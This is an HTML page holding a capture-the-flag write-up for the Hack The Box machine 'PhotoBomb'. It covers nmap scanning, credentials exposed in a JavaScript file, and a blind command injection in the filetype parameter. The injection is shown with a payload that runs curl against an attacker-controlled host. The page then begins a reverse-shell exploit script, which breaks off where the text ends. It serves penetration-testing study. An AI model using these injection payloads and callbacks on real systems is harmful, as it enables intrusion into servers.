<html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=icon href=/images/favicon.svg><link rel=stylesheet href=/scss/global.min.d3cc96f4d8384649c41cedbcf73d695dedba18e800978f9ab7f79a1b6fd908ee.css><link rel=stylesheet href=/css/prism.css><link href="https://fonts.googleapis.com/css?family=Merriweather&display=swap" rel=stylesheet><title>PhotBomb From Hack The Box - Easy Linux Machine | My Blog</title>
<meta name=description content="Recon: Nmap Scan: Quick Nmap Scan: Open Ports: 80 (http) - 22 (ssh) goku@exploitation:~$ export IP=10.10.11.182 goku@exploitation:~$ nmap $IP Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 05:59 CET Nmap scan report for 10.10.11.182 Host is up (0.022s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds Nmap Full Scan: goku@exploitation:~$ nmap -p- $IP Starting Nmap 7."><meta property="og:title" content="PhotBomb From Hack The Box - Easy Linux Machine | My Blog"><meta property="og:site_name" content="My Blog"><meta property="og:description" content="Recon: Nmap Scan: Quick Nmap Scan: Open Ports: 80 (http) - 22 (ssh) goku@exploitation:~$ export IP=10.10.11.182 goku@exploitation:~$ nmap $IP Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 05:59 CET Nmap scan report for 10.10.11.182 Host is up (0.022s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds Nmap Full Scan: goku@exploitation:~$ nmap -p- $IP Starting Nmap 7."><meta property="og:url" content="https://gokupwn.github.io/posts/photobomb-htb-machine/"><meta property="og:type" content="website"><meta property="og:locale" content="en_US"><meta property="og:image" content='https://gokupwn.github.io/images/photobomb.jpg'><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="PhotBomb From Hack The Box - Easy Linux Machine | My Blog"><link rel=canonical href=https://gokupwn.github.io/posts/photobomb-htb-machine/><meta name=twitter:description content="Recon: Nmap Scan: Quick Nmap Scan: Open Ports: 80 (http) - 22 (ssh) goku@exploitation:~$ export IP=10.10.11.182 goku@exploitation:~$ nmap $IP Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 05:59 CET Nmap scan report for 10.10.11.182 Host is up (0.022s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds Nmap Full Scan: goku@exploitation:~$ nmap -p- $IP Starting Nmap 7."><meta name=twitter:image content="https://gokupwn.github.io/images/photobomb.jpg"><meta property="article:published_time" content="2022-12-15T15:44:32+01:00"><meta property="article:updated_time" content="2022-12-15T15:44:32+01:00"></head><body class=line-numbers><script src=/js/initColors.js></script><div class=layout-styled><section class=section><div class=nav-container><a class=logo-link href=/><div id=logo-desktop><svg width="192" height="23" viewBox="0 0 192 23" fill="none" xmlns="http://www.w3.org/2000/svg" className="Logo__Desktop"><g clipPath="url(#clip0)"><path d="M120.941 6.15477h1.512V2.83255l1.661-.38333V6.15477H126.713v1.15H124.114V16.377C124.114 17.314 124.54 17.7826 125.435 17.7826 125.925 17.7826 126.478 17.6335 126.904 17.4205L127.181 18.4214C126.606 18.7835 125.861 18.9964 124.86 18.9964c-1.321.0-2.428-.617600000000003-2.428-2.4703V7.30477H120.92v-1.15H120.941z" fill="#7a8085"/><path d="M131.739 7.77334C132.825 6.70852 134.273 5.89926 135.764 5.89926c1.959.0 3.173 1.04352 3.173 3.27963V17.6122L140.555 17.8465V18.7409h-3.322V9.58352C137.233 7.9863 136.616 7.30482 135.338 7.30482 134.166 7.30482 132.74 8.0076 131.739 8.90204V17.5909L133.442 17.8039V18.7196H128.416V17.8039L130.078 17.5909V1.29926L128.374 1.04371V.0214844H131.739V7.77334v0z" fill="#7a8085"/><path d="M141.854 12.4374C141.854 7.6883 143.92 5.89941 146.731 5.89941c2.917.0 4.536 1.7463 4.536 6.06949v.6601H143.6C143.621 16.3772 144.686 17.8253 147.284 17.8253 148.605 17.8253 149.584 17.3994 150.5 16.7818L151.096 17.6124C150.01 18.5068 148.754 18.9966 147.008 18.9966 143.941 18.9753 141.854 17.2929 141.854 12.4374zM143.621 11.5216H149.521C149.521 8.34849 148.754 6.98552 146.709 6.98552 144.857 6.98552 143.771 8.2633 143.621 11.5216z" fill="#7a8085"/><path d="M162.682 7.85849C163.768 6.70849 165.024 5.87793 166.515 5.87793c1.959.0 3.131 1.04352 3.131 3.27963V17.6335L171.286 17.8677v.8306H167.963V9.68997C167.963 8.07145 167.388 7.32608 166.089 7.32608 164.918 7.32608 163.789 8.02886 162.81 8.9233v8.6889L164.449 17.8464V18.7409h-3.322V9.68997C161.127 8.07145 160.552 7.32608 159.253 7.32608 158.082 7.32608 156.953 8.02886 155.973 8.9233v8.6889L157.677 17.8464V18.7409H152.651V17.8464L154.312 17.6122V7.47515l-1.703-.25555V6.15478H155.654L155.888 7.85849C156.974 6.72978 158.188 5.89923 159.679 5.89923 161.212 5.87793 162.277 6.51682 162.682 7.85849z" fill="#7a8085"/><path d="M171.925 12.4374C171.925 7.6883 173.991 5.89941 176.802 5.89941c2.917.0 4.536 1.7463 4.536 6.06949v.6601h-7.667C173.692 16.3772 174.757 17.8253 177.355 17.8253 178.676 17.8253 179.655 17.3994 180.571 16.7818L181.167 17.6124C180.081 18.5068 178.825 18.9966 177.079 18.9966 174.012 18.9753 171.925 17.2929 171.925 12.4374zM173.692 11.5216h5.899C179.591 8.34849 178.825 6.98552 176.78 6.98552 174.928 6.98552 173.863 8.2633 173.692 11.5216z" fill="#7a8085"/><path d="M183.084 18.0383V15.504H184.234L184.618 17.442C185.278 17.7189 185.789 17.8892 186.811 17.8892 188.664 17.8892 189.558 17.0374 189.558 15.5466c0-1.4907-.72399999999999-2.0657-2.768-2.662C184.831 12.2883 183.382 11.4577 183.382 9.13645 183.382 7.39016 184.639 5.89941 187.195 5.89941 188.664 5.89941 189.835 6.17627 190.687 6.68738V9.15775H189.558L189.132 7.34756C188.579 7.09201 187.961 7.00682 187.258 7.00682 185.789 7.00682 184.852 7.7309 184.852 8.98738 184.852 10.3077 185.576 10.8189 187.365 11.3513c2.066.6602 3.791 1.3629 3.791 4.0463C191.156 17.7615 189.431 18.9753 186.79 18.9753 185.235 18.9753 183.957 18.6346 183.084 18.0383z" fill="#7a8085"/><path class="change-fill" d="M38.3122 9.98811C38.3122 8.66774 37.9501 8.15663 36.9492 8.15663 36.1186 8.15663 35.0964 8.62515 34.3936 9.20015V16.9733L35.8418 17.165v1.4694h-5.75V17.165L31.5825 16.9733V8.24182L30.0918 7.92237v-1.725h3.8333L34.2446 7.64552C35.3733 6.55941 36.6298 5.87793 38.1418 5.87793 39.9946 5.87793 41.102 6.92145 41.102 9.07237V16.9733L42.5927 17.165v1.4694H38.3122V9.98811v0z" fill="#000"/><path class="change-fill" d="M62.3982 17.1858v1.4695h-6.325V17.1858L57.564 16.9942V8.2627l-1.4908-.31944v-1.725h3.7695L60.226 8.17752C61.0779 6.85715 62.1427 5.94141 63.6973 5.94141 63.8677 5.94141 64.0594 5.9627 64.1871 6.0053L63.8251 8.94418C63.5483 8.81641 63.2501 8.77381 62.8668 8.77381 61.8871 8.77381 61.1418 9.05067 60.3751 9.71085V16.9516L62.3982 17.1858z" fill="#000"/><path class="change-fill" d="M76.7098 6.19733h1.3843V3.08807l2.4491-.53241V6.21863h2.4277V8.0927H80.5432v7.5815C80.5432 16.5899 80.8839 16.9946 81.6293 16.9946 82.0978 16.9946 82.5876 16.8455 82.907 16.6751L83.3543 18.3575C82.758 18.6983 81.9061 18.9751 80.6709 18.9751 78.9672 18.9751 78.0941 18.1658 78.0941 16.0362V8.0927H76.7098V6.19733z" fill="#000"/><path class="change-fill" d="M90.4664 17.1648v1.4695H84.6738V17.1648L86.1646 16.9731V8.24167L84.6738 7.92222v-1.725h4.3019V16.9731L90.4664 17.1648zM85.696 1.76759C85.696.787963 86.4627.0 87.4423.0 88.422.0 89.1886.766667 89.1886 1.76759 89.1886 2.72593 88.422 3.51389 87.421 3.51389 86.4627 3.51389 85.696 2.72593 85.696 1.76759z" fill="#000"/><path class="change-fill" d="M98.3251 7.90097V6.19727H103.053v1.725L101.924 8.11393 98.3251 18.6556H95.663L92.064 8.09264 90.9991 7.92227v-1.725h5.2602v1.7037L95.0242 8.09264 96.7279 13.6084C97.0473 14.6519 97.1964 15.5037 97.3668 16.4834H97.388C97.5371 15.525 97.7714 14.5241 98.0482 13.5871l1.6186-5.51576L98.3251 7.90097z" fill="#000"/><path class="change-fill" d="M75.6867 17.1224C74.5793 17.1437 74.3664 16.952 74.3664 15.9724V9.79645c0-2.83241-1.3843-3.91852-4.0463-3.91852-1.938.0-3.5778.575-4.8982 1.40556L66.2312 9.02978C67.3599 8.45478 68.4673 8.09274 69.7238 8.09274 71.1932 8.09274 71.5552 8.88071 71.5552 10.265V11.0316 11.2233v1.5546V12.8844v3.237C71.0867 16.6326 70.4052 17.0585 69.4469 17.0585 68.3821 17.0585 67.871 16.5261 67.871 15.0353c0-1.725.724100000000007-2.2148 2.6194-2.2574V11.2233C66.6358 11.2659 65.0386 12.4372 65.0386 15.2057c0 2.6408 1.4481 3.7695 3.6203 3.7695 1.5547.0 2.40649999999999-.6602 3.1306-1.4056C72.0451 18.5705 72.833 18.9752 73.8978 18.9752 74.6645 18.9752 75.3886 18.7622 75.8571 18.5066L75.6867 17.1224z" fill="#000"/><path class="change-fill" d="M54.4968 17.1224C53.3894 17.1437 53.1764 16.952 53.1764 15.9724V9.79645c0-2.83241-1.3842-3.91852-4.0463-3.91852-1.9379.0-3.5778.575-4.8981 1.40556L45.0412 9.02978C46.1699 8.45478 47.2773 8.09274 48.5338 8.09274 50.0033 8.09274 50.3653 8.88071 50.3653 10.265V11.0316 11.2233v1.5546V12.8844v3.237C49.8968 16.6326 49.2153 17.0585 48.257 17.0585 47.1922 17.0585 46.681 16.5261 46.681 15.0353c0-1.725.7241-2.2148 2.6195-2.2574V11.2233C45.4459 11.2659 43.8486 12.4372 43.8486 15.2057c0 2.6408 1.4482 3.7695 3.6204 3.7695 1.5546.0 2.4065-.6602 3.1306-1.4056C50.8551 18.5705 51.6431 18.9752 52.7079 18.9752 53.4746 18.9752 54.1986 18.7622 54.6672 18.5066L54.4968 17.1224z" fill="#000"/><path class="change-fill" d="M107.653 13.055H113.594V11.9476C113.594 7.47534 111.869 5.89941 108.803 5.89941c-3.173.0-5.175 1.89537-5.175 6.51669.0 4.6852 1.895 6.5805 5.43000000000001 6.5805C110.954 18.9966 112.231 18.5068 113.467 17.5272L112.657 16.0577c-.978999999999999.6176-1.789 1.001-3.194 1.001C107.546 17.0587 106.801 16.1855 106.63 14.0133 106.588 13.6939 106.567 13.0976 106.567 12.4587c0-.4047.0-.788.0210000000000008-1.0861V11.3513C106.737 8.51886 107.397 7.60312 108.781 7.60312c1.619.0 2.002.979630000000001 2.002 3.74818H107.674V13.055H107.653z" fill="#000"/><path class="change-fill" d="M17.5907 20.2954H0V23H17.5907V20.2954z" fill="#000"/><path class="change-fill" d="M0 7.96484V18.9537l5.38796-3.7694v-3.45L0 7.96484z" fill="#000"/><path class="change-fill" d="M17.5689 10.9463V0L12.1597 3.74815V7.13426l5.4092 3.81204z" fill="#000"/><path class="change-fill" d="M17.5907 18.975 17.5694 12.288.0.0V6.62315L17.5907 18.975z" fill="#000"/></g><defs><clipPath id="clip0"><rect width="191.156" height="23" fill="#fff"/></clipPath></defs></svg></div><div id=logo-mobile class=hidden><svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 512 512"><g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="" stroke="none"><path d="M590 4383l1-738 756-530c698-489 1151-807 2618-1837l540-380 3 748c2 590-1 751-10 760-7 7-308 218-668 470-360 251-1230 859-1933 1351-702 491-1284 893-1292 893-13 0-15-92-15-737z"/><path d="M3887 4708l-597-412v-381-381l597-419c328-231 602-421 610-423 11-3 13 204 13 1212 0 987-2 1216-13 1216-7 0-282-186-610-412z"/><path d="M590 2135c0-910 3-1225 11-1225 10 0 343 231 1049 728l155 109v389 388l-595 418c-327 229-601 417-607 418-10 0-13-251-13-1225z"/><path d="M590 320V10h1960 1960v310 310H2550 590V320z"/></g></svg></div><span class=header-hidden>Navigate back to the homepage</span></a><div class=nav-controls><button id=copyButton class=icon-wrapper><svg class="icon-image" width="24" height="20" viewBox="0 0 24 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M2 5C2 3.34328 3.34328 2 5 2h9c1.6567.0 3 1.34328 3 3V9c0 1.6567-1.3433 3-3 3H10C9.44771 12 9 12.4477 9 13S9.44771 14 10 14h4c2.7613.0 5-2.2387 5-5V5c0-2.76128-2.2387-5-5-5H5C2.23872.0.0 2.23872.0 5V9c0 1.4938.656313 2.8361 1.6935 3.7509C2.10768 13.1163 2.73961 13.0767 3.10494 12.6625 3.47028 12.2483 3.43068 11.6164 3.0165 11.2511 2.39169 10.6999 2 9.89621 2 9V5zm5 6c0-1.65672 1.34328-3 3-3h4C14.5523 8 15 7.55228 15 7S14.5523 6 14 6H10C7.23872 6 5 8.23872 5 11v4c0 2.7613 2.23872 5 5 5h9c2.7613.0 5-2.2387 5-5V11C24 9.50621 23.3437 8.16393 22.3065 7.24906 21.8923 6.88372 21.2604 6.92332 20.8951 7.3375 20.5297 7.75168 20.5693 8.38361 20.9835 8.74894 21.6083 9.30007 22 10.1038 22 11v4c0 1.6567-1.3433 3-3 3H10c-1.65672.0-3-1.3433-3-3V11z" fill="#000"/></svg><div id=toolTip class=tool-tip>copied</div><input id=copyText style=opacity:0 type=text class=tool-tip>
</button>
<button id=themeColorButton class=icon-wrapper><div id=sunRays class=sun-rays></div><div id=moonOrSun class=moon-or-sun></div><div id=moonMask class=moon-mask></div></button></div></div></section><script src=/js/toggleLogos.js></script><script src=/js/toggleColors.js></script><script src=/js/copyUrl.js></script><section class="section narrow"><section id=articleHero class="section narrow"><div class=article-hero><header class=article-header><h1 class=article-hero-heading>PhotBomb From Hack The Box - Easy Linux Machine</h1><div class=article-hero-subtitle><div class=article-meta><div class=article-coauthors-container><span id=collapsedCoauthors class=article-coauthors-collapsed><div class=article-coauthors-list style=width:0></div><strong class=article-coauthors-name-container></strong><div class=article-coauthors-icon-container><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path style="fill:var(--primary)" d="M5.3209 8.86719 8.50026 12.0396 11.6796 8.86719 12.6563 9.84385 8.50026 13.9999 4.34424 9.84385 5.3209 8.86719z"/><path style="fill:var(--primary)" d="M11.6791 8.13281 8.49974 4.96039 5.32039 8.13281 4.34373 7.15615 8.49974 3.00013 12.6558 7.15615 11.6791 8.13281z"/></svg></div></span><ul id=uncollapsedCoauthors class="article-coauthors-list-open hidden"><div id=uncollapsedAction class=article-icon-open-container><svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path style="fill:var(--primary)" d="M11.6796 14 8.50023 10.8276 5.32088 14 4.34422 13.0233 8.50023 8.86732 12.6563 13.0233 11.6796 14z"/><path style="fill:var(--primary)" d="M5.32041 3 8.49977 6.17243 11.6791 3 12.6558 3.97666 8.49977 8.13268 4.34375 3.97666 5.32041 3z"/></svg></div></ul></div><script src=/js/collapseAuthors.js></script>December 15, 2022
• 10 min read</div></div></header><div class=article-hero-image id=ArticleImage__Hero><img src=/images/photobomb.jpg></div></div></section><aside id=progressBar class=aside-container><div class=aside-align><div><div class=overlap-container></div></div></div><div class=progress-container tabindex={-1}><div class=track-line aria-hidden=true><div id=progressIndicator class=progress-line></div></div></div></aside><article id=articleContent class=post-content style=position:relative><h1 id=recon>Recon:</h1><h2 id=nmap-scan>Nmap Scan:</h2><h3 id=quick-nmap-scan>Quick Nmap Scan:</h3><ul><li>Open Ports: 80 (http) - 22 (ssh)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ export IP<span style=color:#f92672>=</span>10.10.11.182
</span></span><span style=display:flex><span>goku@exploitation:~$ nmap $IP
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-15 05:59 CET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.182
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.022s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 0.50 seconds
</span></span></code></pre></div><h3 id=nmap-full-scan>Nmap Full Scan:</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ nmap -p- $IP
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-15 06:01 CET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.182
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.024s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 9.12 seconds
</span></span></code></pre></div><h3 id=nmap-services-version-fingerprinting>Nmap Services Version Fingerprinting:</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ nmap -p80,22 -sV -sC $IP
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-12-15 06:02 CET
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.182
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.022s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> e22473bbfbdf5cb520b66876748ab58d <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 04e3ac6e184e1b7effac4fe39dd21bae <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 20e05d8cba71f08c3a1819f24011d29e <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://photobomb.htb/
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 7.72 seconds
</span></span></code></pre></div><ul><li>Let&rsquo;s add <code>photobomb.htb</code> to our <code>/etc/hosts</code> file:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@exploitation:/home/goku<span style=color:#ae81ff>\#</span> echo <span style=color:#e6db74>&#34;10.10.11.182 photobomb.htb&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id=recon-web-application---port-80-http>Recon: Web application - Port 80 (http)</h2><ul><li>Main page:</li></ul><p><img src=/images/Pasted-image-20221215060938.png alt="Image alt"></p><ul><li>Web Tech Stack:</li></ul><p><img src=/images/Pasted-image-20221215070211.png alt="Image alt"></p><ul><li><p>Main page source page:</p><ul><li>Intersting message:</li></ul><blockquote><p>To get started, please click here! (the credentials are in your welcome pack).</p></blockquote></li></ul><p><img src=/images/Pasted-image-20221215061346.png alt="Image alt"></p><ul><li>Click here will take you to an new Endpoint: <code>/printer</code></li><li>From the page source code we can discover a custom javascript file <code>photobomb.js</code> ! Intersting!. Let&rsquo;s examine it!</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#75715e>// photobomb.js content
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>init</span>() {
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> (
</span></span><span style=display:flex><span>    document.<span style=color:#a6e22e>cookie</span>.<span style=color:#a6e22e>match</span>(<span style=color:#e6db74>/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/</span>)
</span></span><span style=display:flex><span>  ) {
</span></span><span style=display:flex><span>    document
</span></span><span style=display:flex><span>      .<span style=color:#a6e22e>getElementsByClassName</span>(<span style=color:#e6db74>&#34;creds&#34;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>      .<span style=color:#a6e22e>setAttribute</span>(<span style=color:#e6db74>&#34;href&#34;</span>, <span style=color:#e6db74>&#34;http://pH0t0:b0Mb!@photobomb.htb/printer&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>window.<span style=color:#a6e22e>onload</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>init</span>;
</span></span></code></pre></div><ul><li><p><code>/printer</code> endpoint:</p><ul><li>Login Needed</li></ul></li></ul><p><img src=/images/Pasted-image-20221215062312.png alt="Image alt"></p><ul><li>From the <code>photbomb.js</code>:<ul><li>We can find valide credentials as the following message state:</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#75715e>// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>document
</span></span><span style=display:flex><span>  .<span style=color:#a6e22e>getElementsByClassName</span>(<span style=color:#e6db74>&#34;creds&#34;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>  .<span style=color:#a6e22e>setAttribute</span>(<span style=color:#e6db74>&#34;href&#34;</span>, <span style=color:#e6db74>&#34;http://pH0t0:b0Mb!@photobomb.htb/printer&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Username: pH0t0
</span></span></span><span style=display:flex><span><span style=color:#75715e>// Password: b0Mb!
</span></span></span></code></pre></div><ul><li>After login to the <code>/printer</code>:</li></ul><p><img src=/images/Pasted-image-20221215063041.png alt="Image alt"></p><ul><li>You can here choose a photo to download, the photo&rsquo;s quality, the photo&rsquo;s type (png or jpg) and then click the download button</li><li>Let&rsquo;s fire up burpsuite and intercept this request\</li></ul><p><img src=/images/Pasted-image-20221215063530.png alt="Image alt"></p><ul><li>The Download HTTP requets:</li></ul><p><img src=/images/Pasted-image-20221215064122.png alt="Image alt"></p><ul><li><p>After Anlysing the web application:</p><ul><li>The web application does not use a database. Photos are hard-coded inside the html code</li><li>The Web application performs image conversion behind the scene from jpg to png - based on the <code>filetype</code> parameter</li></ul></li><li><p>If we submit an unknown filetype, we will get the following error:</p></li></ul><p><img src=/images/Pasted-image-20221215071935.png alt="Image alt"></p><ul><li>I tried arbitray files from the server but i get the following error <code>Invalid photo.</code></li><li>As we said before the web application performs some kind of conversion, so i decided to test for command injection vulnerability.</li><li>I tested the 3 parameters. But, only the <code>filetype</code> was injectable with a blind command injection.</li></ul><h3 id=verifying-the-blind-command-injection-vulnerability>Verifying the blind command injection vulnerability:</h3><ul><li>Start a local http server:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Terminal 1</span>
</span></span><span style=display:flex><span>goku@exploitation:~$ python -m http.server <span style=color:#ae81ff>8088</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>8088</span> <span style=color:#f92672>(</span>http://0.0.0.0:8088/<span style=color:#f92672>)</span> ...
</span></span></code></pre></div><ul><li>Insert the following payload into the <code>filetype</code> parameter:
Payload: <code>jpg;curl http://10.10.14.2:8088</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Teminal 2</span>
</span></span><span style=display:flex><span>goku@exploitation:~$ curl -X POST -H <span style=color:#e6db74>&#34;Authorization: Basic cEgwdDA6YjBNYiE=&#34;</span> -d <span style=color:#e6db74>&#34;photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;curl http://10.10.14.2:8088&amp;dimensions=600x400&#34;</span> http://photobomb.htb/printer
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>goku@exploitation:~$
</span></span></code></pre></div><ul><li>An HTTP request received from the <code>photobomb</code> remote machine:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Terminal 1</span>
</span></span><span style=display:flex><span>goku@exploitation:~$ python -m http.server <span style=color:#ae81ff>8088</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>8088</span> <span style=color:#f92672>(</span>http://0.0.0.0:8088/<span style=color:#f92672>)</span> ...
</span></span><span style=display:flex><span>10.10.11.182 - - <span style=color:#f92672>[</span>15/Dec/2022 07:30:35<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET / HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> -
</span></span></code></pre></div><h2 id=getting-foothold-user-flag-exploiting-the-command-injection-vulnerability>Getting foothold (User flag): Exploiting the command injection vulnerability</h2><ul><li>A simple bash script to exploit the vuln automatically:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># exploit.sh</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Get the Machine IP</span>
</span></span><span style=display:flex><span>IP<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>ip a s tun0 | grep -o <span style=color:#e6db74>&#39;[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}&#39;</span><span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Python reverse shell</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Bulding the Payload&#34;</span>
